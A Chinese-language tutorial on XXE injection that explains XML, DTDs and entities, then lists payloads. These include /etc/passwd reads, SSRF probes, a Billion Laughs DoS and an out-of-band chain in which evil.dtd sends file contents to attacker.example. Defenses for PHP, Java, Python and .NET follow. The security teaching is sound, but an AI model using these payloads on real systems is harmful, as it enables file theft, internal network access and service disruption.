# XXE

XXE 全称是 `XML External Entity`，中文通常叫“XML 外部实体注入”。

很多人一上来就记 payload，但 XXE 其实是 **XML 语法 + DTD/实体机制 + 解析器配置** 共同作用的结果。想真正吃透 XXE，最好先从 XML 本身开始。

## XML 是什么

XML，`eXtensible Markup Language`，可扩展标记语言，本质上是一种 **用标签描述结构化数据** 的文本格式。

它和 HTML 长得很像，但目标不同：

- HTML 更偏“显示页面”；
- XML 更偏“描述数据结构”。

### 一个最简单的 XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>alice</name>
    <role>admin</role>
</user>
```

这里面：

- `<?xml ... ?>` 是 XML 声明；
- `<user>` 是根节点；
- `<name>`、`<role>` 是子节点；
- XML 强调标签必须成对、嵌套必须合法。

### XML 的常见用途

虽然平时 Web 里 JSON 更多，但 XML 仍然大量存在于：

- SOAP Web Service
- SAML 单点登录
- RSS / Atom
- SVG 图片
- Office 文档格式的一部分
- Java 配置文件
- 各类老旧系统接口
- 文件导入、上传、批处理任务

也正因为这些地方还在用 XML，XXE 才长期存在。

## XML 的基本组成

### 1. 元素

```xml
<name>alice</name>
```

### 2. 属性

```xml
<user id="1" role="admin">alice</user>
```

### 3. 注释

```xml
<!-- comment -->
```

### 4. CDATA

用于告诉解析器“这里面的内容先别当标签解释”。

```xml
<data><![CDATA[<test>hello</test>]]></data>
```

### 5. 实体引用

XML 里本来就存在一些预定义实体：

```xml
&lt;   <
&gt;   >
&amp;  &
&quot; "
&apos; '
```

而 XXE 关键利用点就在于：**XML 允许自定义实体**。

## DTD 是什么

DTD，`Document Type Definition`，文档类型定义。它用来约束一个 XML 文档里：

- 可以有哪些元素；
- 元素之间怎么嵌套；
- 元素可以有哪些属性；
- 可以定义哪些实体。

### 内部 DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
    <!ELEMENT note (to,from,body)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
]>
<note>
    <to>Bob</to>
    <from>Alice</from>
    <body>Hello</body>
</note>
```

这里 `<!DOCTYPE ... [ ... ]>` 里的内容就是内部 DTD。

### 外部 DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>Bob</to>
    <from>Alice</from>
    <body>Hello</body>
</note>
```

也可以把 DTD 放到外部文件中，再由解析器加载。

这一步非常重要，因为：

- **外部 DTD = 解析器可能去读取本地文件或发起网络请求**；
- XXE 攻击大多数就建立在这件事上。

## 实体是什么

实体可以理解成“变量”或“宏替换”。解析 XML 时，解析器会把实体替换成它代表的值。

### 内部实体

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY name "alice">
]>
<user>&name;</user>
```

解析后：

```xml
<user>alice</user>
```

### 外部实体

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

这里的 `SYSTEM "file:///etc/passwd"` 表示定义一个外部实体，内容来自系统资源。

如果解析器真的去读取这个路径，并把内容插入 XML 结果里，那就发生了 XXE。

### 参数实体

参数实体一般写成 `%name;`，主要用于 DTD 内部，Blind XXE 和外部 DTD 利用里很常见。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
```

后面很多高级利用都和参数实体有关。

## 解析器是怎么处理 XML 的

当服务端收到 XML 后，通常会交给 XML 解析器。

解析器的工作一般包括：

- 检查 XML 语法是否正确；
- 构建 DOM 树，或者按流式方式处理；
- 解析 DTD；
- 展开实体；
- 在需要时加载外部资源。

于是，XXE 是否成立，往往取决于下面几个条件：

- 应用确实接收并解析 XML；
- 解析器允许 `DOCTYPE`；
- 解析器允许外部实体；
- 解析器会访问文件系统或网络；
- 解析结果以某种方式可见，或者可以带外回显。

## XXE 的本质

XXE 不是“XML 本身有洞”，而是：

- 应用把 **攻击者可控的 XML** 交给了解析器；
- 解析器又开启了 **DTD / 外部实体 / 外部资源加载**；
- 最终导致 **本地文件读取、内网探测、请求伪造、数据带外泄露、拒绝服务** 等后果。

一句话概括：

> 攻击者借 XML 解析器的“自动帮忙读资源”能力，去读取本地文件或访问外部目标。

## 一个最基础的 XXE 例子

假设服务端会解析如下 XML：

```xml
<?xml version="1.0"?>
<user>
    <name>alice</name>
</user>
```

而服务端代码直接把用户输入交给 XML 解析器，没有禁用实体。

那么攻击者可以构造：

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
</user>
```

如果解析成功，`&xxe;` 会被替换为 `/etc/passwd` 的内容。

若页面、日志、报错、调试输出中能看到解析结果，就能完成文件读取。

## XXE 的利用前提

不是所有 XML 输入点都能打出 XXE，常见前提如下：

### 1. 存在 XML 输入面

常见位置：

- `Content-Type: application/xml`
- `text/xml`
- SOAP 请求
- 上传的 `.xml`、`.svg` 文件
- SAML 断言
- 导入配置、导入数据、批处理任务

### 2. 解析器支持 DTD

如果服务端直接禁用了 `DOCTYPE`，很多 XXE payload 会直接失效。

### 3. 解析器允许外部实体

只允许内部实体、不允许外部资源时，XXE 威力会大幅下降。

### 4. 有回显或可带外利用

如果读取结果不会出现在响应里，就要考虑：

- 报错回显；
- DNS / HTTP 带外泄露；
- 侧信道。

## XXE 常见危害

### 1. 读取本地文件

最经典：

- Linux：`/etc/passwd`
- Web 根目录源代码
- 配置文件
- 密钥、证书、token
- Windows：`C:\Windows\win.ini`

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 2. SSRF / 内网探测

如果外部实体支持 `http://`，解析器就可能替攻击者发请求：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root>&xxe;</root>
```

这会带来：

- 探测内网端口；
- 访问仅内网开放的服务；
- 命中云环境元数据接口；
- 联动其他 SSRF 漏洞场景。

### 3. Blind XXE

响应里没有文件内容，但解析器仍会访问外部资源。

这时可以通过：

- 恶意外部 DTD；
- DNS 请求；
- HTTP 回连；
- 报错信息；

来判断漏洞是否存在，甚至带外拿到数据。

### 4. 利用本地 DTD / 参数实体做高级利用

在某些环境里，即使直接写简单 payload 不成功，也可能通过：

- 引用本地已有 DTD；
- 使用参数实体 `%xxe;`；
- 链式构造新的实体；

完成更复杂的读取或外带。

### 5. 拒绝服务

经典是实体递归展开，也就是“Billion Laughs”。

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY a "1234567890">
 <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
 <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
]>
<lolz>&c;</lolz>
```

如果解析器对实体展开没有限制，内存和 CPU 都可能被打爆。

## 从利用角度理解几种 XXE

### 1. 回显型 XXE

特征：

- 读取的内容直接出现在响应里；
- 最容易确认和利用。

示例：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><name>&xxe;</name></root>
```

### 2. 盲 XXE

特征：

- 页面里看不到读取结果；
- 只能通过外联或报错判断。

可先用简单探测：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://attacker.example/xxe-test">
]>
<root>&xxe;</root>
```

如果攻击者控制的服务器收到请求，说明至少存在外部实体解析。

### 3. 带外 XXE（OOB XXE）

这是盲 XXE 的进阶版，思路是：

- 先让目标加载攻击者控制的外部 DTD；
- 再由该 DTD 去读本地文件；
- 再把文件内容拼进 URL / DNS 请求，回传给攻击者。

一个常见思路如下：

受害端请求：

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://attacker.example/evil.dtd">
    %remote;
]>
<root>test</root>
```

攻击者控制的 `evil.dtd`：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?data=%file;'>">
%all;
```

随后在 XML 中触发：

```xml
<root>&send;</root>
```

这样本地文件内容就可能通过 HTTP 参数带出来。

注意：

- 现实中是否成功，取决于解析器、编码、长度限制、网络策略；
- 很多时候 DNS 外带比 HTTP 更稳；
- 某些环境会禁止直接访问外网，但仍可能访问内网。

### 4. 参数实体 XXE

参数实体主要出现在 DTD 中：

```xml
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
```

它不能像普通实体那样直接在 XML 节点正文里写 `%xxe;` 就显示出来，但在 Blind XXE、高级 DTD 利用、绕过过滤时非常关键。

## 为什么有时 payload 不生效

打 XXE 时，最常见的问题不是“payload 写错了”，而是 **解析器行为与你想的不一样**。

常见原因：

### 1. 禁用了 `DOCTYPE`

有些解析器或框架会直接拒绝：

```xml
<!DOCTYPE ...>
```

那就意味着传统 XXE 基本没戏。

### 2. 禁用了外部实体

允许 DTD，但不允许 `SYSTEM` / `PUBLIC` 外部资源。

这时：

- 内部实体还能用；
- XXE 读取外部资源不一定能用。

### 3. 只解析 XML，不回显解析结果

例如服务端只是拿 XML 做业务逻辑校验，结果不会展示。

那就更像 Blind XXE。

### 4. 过滤了关键字

有些程序会粗糙过滤：

- `DOCTYPE`
- `ENTITY`
- `SYSTEM`
- `file://`

这时要考虑：

- 编码变体；
- 参数实体；
- 外部 DTD；
- 其他协议或路径形式。

### 5. 协议受限

不同解析器支持的协议可能不同，常见有：

- `file://`
- `http://`
- `https://`
- `ftp://`

有些甚至支持更多 wrapper，但这取决于语言、库和配置，不能一概而论。

### 6. 权限问题

就算能读文件，也只能读 **解析进程本身有权限访问** 的内容。

例如：

- Web 服务用户是 `www-data`；
- 读不了 root 私有文件；
- 但可能能读 Web 配置、源码、临时文件、日志。

## 常见 XXE 测试思路

### 第一步：先确认是不是 XML

看请求特征：

- `Content-Type: application/xml`
- 请求体有尖括号标签
- SOAP Envelope
- 上传 XML/SVG

### 第二步：先做最小探测

例如提交一个正常 XML，确认服务端真的会解析。

### 第三步：尝试 `DOCTYPE`

如果加上 `DOCTYPE` 直接报错，可以观察：

- 是否报“禁止 DOCTYPE”；
- 是否只是语法错误；
- 是否完全无变化。

### 第四步：做本地文件读取或 HTTP 探测

本地读取测试：

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
    <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<x>&test;</x>
```

Windows 测试：

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
    <!ENTITY test SYSTEM "file:///C:/Windows/win.ini">
]>
<x>&test;</x>
```

HTTP 外联测试：

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
    <!ENTITY test SYSTEM "http://attacker.example/xxe">
]>
<x>&test;</x>
```

### 第五步：没有回显就考虑 Blind/OOB

如果页面没东西，但确认服务端发出了请求，那就转向：

- 外部 DTD；
- DNSLog / HTTPLog；
- 参数实体；
- 报错回显。

## XXE 常见打点位置

除了“明显的 XML 接口”，还有很多容易忽略的地方：

- SOAP API
- SAML 认证
- SVG 图片上传
- RSS 导入
- Android / Java 配置解析
- `.docx` / `.xlsx` / `.odt` 等基于 XML 的文档处理
- 依赖 XML 的消息队列或中间件
- 第三方库内部帮你解析 XML 的功能点

很多时候开发者自己并没写 XML 解析代码，但底层框架写了。

## XXE 与 SSRF 的关系

XXE 经常被看作 SSRF 的一个变种入口。

因为当解析器去请求：

```xml
SYSTEM "http://127.0.0.1:8080/"
```

本质上就是 **服务端替攻击者发 HTTP 请求**。

所以 XXE 可以用来：

- 探测本地端口；
- 访问内网服务；
- 命中云元数据接口；
- 配合 Redis、Jenkins、Consul 等服务做后续利用。

## XXE 与文件读取的关系

XXE 最经典的结果就是任意文件读取。

CTF 或实战里常见目标：

### Linux

- `/etc/passwd`
- `/etc/hosts`
- Web 根目录源码
- 数据库配置文件
- 日志文件
- SSH 相关文件

### Windows

- `C:\Windows\win.ini`
- `C:\Windows\System32\drivers\etc\hosts`
- 网站配置
- 应用源码与日志

进一步往往是：

- 先读配置；
- 再拿数据库口令、API key、token；
- 再横向或提权。

## PHP 里常见的 XXE 场景

PHP 做题时，最常见的是下面这些函数或类：

- `simplexml_load_string()`
- `simplexml_load_file()`
- `DOMDocument::loadXML()`
- `DOMDocument::load()`
- `XMLReader`
- `SoapClient` / `SoapServer`

### 一个危险示例

```php
<?php
$xml = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
echo $dom->saveXML();
```

问题点：

- `LIBXML_NOENT`：会替换实体；
- `LIBXML_DTDLOAD`：会加载 DTD；
- 两者叠加，XXE 风险非常高。

### 为什么很多文章对 PHP 版本说法不一样

因为 PHP / libxml 在不同时期对实体加载、默认行为、错误处理都调整过，所以老文章和新环境可能不一致。

做题或审计时要特别注意：

- PHP 具体版本；
- libxml 版本；
- 是否显式传入危险 flag；
- 框架有没有二次封装。

### PHP 防御建议

- 非必要不要接受 XML，优先 JSON；
- 如果必须用 XML，禁用外部实体和外部 DTD；
- 不要使用 `LIBXML_NOENT`、`LIBXML_DTDLOAD` 这类会扩大攻击面的选项；
- 限制网络访问与文件访问；
- 对上传的 SVG/XML 做单独安全处理，不要直接信任。

## Java 里常见的 XXE 场景

Java 是 XXE 的重灾区之一，常见入口包括：

- `DocumentBuilderFactory`
- `SAXParserFactory`
- `XMLInputFactory`
- `TransformerFactory`
- `SchemaFactory`
- `SAXReader`
- `JDOM` / `dom4j`

### 典型危险点

如果只是 `newDocumentBuilder().parse(...)`，但没显式关掉 DTD 和外部实体，就可能有问题。

### 常见加固思路

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

核心思想就两点：

- 不让它吃 `DOCTYPE`；
- 不让它解析外部实体。

## Python 里常见的 XXE 场景

Python 常见 XML 处理包括：

- `xml.etree.ElementTree`
- `xml.dom.minidom`
- `xml.sax`
- `lxml`

安全上最常见建议是：

- 不要直接用不安全默认配置解析不可信 XML；
- 优先使用专门的安全库，例如 `defusedxml`；
- 对网络和文件访问做额外限制。

## .NET 里常见的 XXE 场景

常见对象：

- `XmlDocument`
- `XmlReader`
- `XDocument`

典型安全思路：

- `DtdProcessing = Prohibit`
- `XmlResolver = null`

也就是：

- 不处理 DTD；
- 不解析外部资源。

## XXE 的防御思路

防御 XXE 最重要的是理解：**不要把“攻击者可控的 XML + 可自动加载资源的解析器”放到一起。**

### 1. 能不用 XML 就不用

新系统优先 JSON。

### 2. 禁用 DTD

这是最直接有效的手段之一。

### 3. 禁用外部实体

即使必须保留部分 XML 功能，也尽量：

- 禁止 `SYSTEM` / `PUBLIC` 外部实体；
- 禁止参数实体加载外部资源。

### 4. 禁用外部网络访问

即使解析器被打到，也尽量让它：

- 不能访问外网；
- 不能访问敏感内网；
- 不能访问云元数据接口。

### 5. 使用安全库 / 安全配置

不同语言都有对应的安全开关，不要依赖默认值。

### 6. 做输入校验与协议限制

例如：

- 限制文件类型；
- 校验上传内容；
- 限制可用 schema；
- 不允许自定义 DTD。

### 7. 最小权限运行

让解析器进程只能访问本来就该访问的少量文件。

### 8. 关闭详细报错

避免把读取结果、路径、栈信息直接送给攻击者。

## 审计代码时看什么

看到下面这些情况时，要优先联想到 XXE：

- 代码接收原始请求体并当 XML 解析；
- `loadXML()`、`parse()`、`simplexml_*()` 等调用；
- 解析 SVG、SOAP、SAML；
- 解析器配置里出现“加载 DTD”“展开实体”；
- 上传 XML 文件后服务端会做内容解析；
- 框架层自动反序列化 XML。

审计关键词可以包括：

- `DOCTYPE`
- `ENTITY`
- `loadXML`
- `simplexml`
- `DocumentBuilderFactory`
- `SAXParserFactory`
- `XmlDocument`
- `XmlReader`

## 做题时的实战节奏

### 1. 先判断是不是 XML 面

不要一看到尖括号就无脑打，先确认请求是否真的会进入 XML 解析器。

### 2. 先试最小回显型 payload

优先尝试本地文件读取，看是否直接有回显。

### 3. 再试 HTTP/DNS 探测

确认是否存在 Blind XXE。

### 4. 再考虑参数实体 / 外部 DTD

这是盲注和复杂场景的重点。

### 5. 最后再考虑协议、编码、过滤绕过

如果前面都失败，再去想更复杂的绕过，不要一上来就堆 payload。

## 一个完整的学习顺序

如果你在系统学习 XXE，建议按下面顺序吃：

1. 先理解 XML 语法
2. 再理解 DTD 与实体
3. 再理解内部实体和外部实体的区别
4. 再看解析器是如何加载资源的
5. 再学回显型 XXE
6. 再学 Blind XXE / OOB XXE
7. 最后再学不同语言里的防御配置

按这个顺序学，很多 payload 你不用死记，也能自己推出来。

## 一些易混点

### 1. XXE 不等于任意文件读取

任意文件读取只是 XXE 的一种常见结果。

XXE 还能造成：

- SSRF
- Blind 数据泄露
- DoS
- 配置泄露

### 2. 有 XML 不一定有 XXE

如果解析器禁用了 `DOCTYPE` 和外部实体，那就可能没有 XXE。

### 3. 能读文件不一定能 RCE

XXE 主要是读和请求，不是天然等于代码执行。

但它经常能：

- 读源码；
- 读配置；
- 拿凭据；
- 再配合其他漏洞升级。

### 4. 新版本更安全，不代表绝对安全

很多语言和库的新版本默认确实更谨慎，但：

- 老项目可能没升级；
- 开发者可能手动打开了危险选项；
- 第三方库可能重新引入风险。

## 一句话总结

XXE 的核心不是 payload，而是：

> 攻击者控制 XML，解析器又帮他去读了本地或远程资源。

把 XML、DTD、实体、解析器行为四件事串起来，XXE 才算真正学明白。
